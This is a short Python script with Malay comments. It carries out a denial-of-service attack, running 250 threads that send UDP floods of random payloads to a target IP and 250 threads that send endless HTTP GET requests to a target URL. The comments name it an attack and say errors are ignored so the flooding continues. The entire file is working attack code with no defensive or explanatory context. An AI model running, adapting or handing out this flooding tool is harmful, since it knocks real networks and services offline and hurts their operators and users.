import socket
import threading
import random
import requests

# Konfigurasi sasaran
target_ip = "192.168.1.1"  # IP sasaran
target_port_udp = 80  # Port untuk serangan UDP
target_url_http = "http://example.com"  # URL untuk serangan HTTP

# Fungsi untuk UDP Flood
def udp_flood():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)  # Data rawak yang dihantar
    while True:
        try:
            client.sendto(payload, (target_ip, target_port_udp))
        except:
            pass  # Abaikan error untuk teruskan serangan

# Fungsi untuk HTTP Flood
def http_flood():
    while True:
        try:
            requests.get(target_url_http)  # Hantar permintaan HTTP GET
        except requests.exceptions.RequestException:
            pass  # Abaikan error untuk teruskan serangan

# Jalankan kedua-dua serangan serentak dengan beberapa thread
for i in range(250):  # 250 thread untuk UDP Flood
    thread_udp = threading.Thread(target=udp_flood)
    thread_udp.start()

for i in range(250):  # 250 thread untuk HTTP Flood
    thread_http = threading.Thread(target=http_flood)
    thread_http.start()
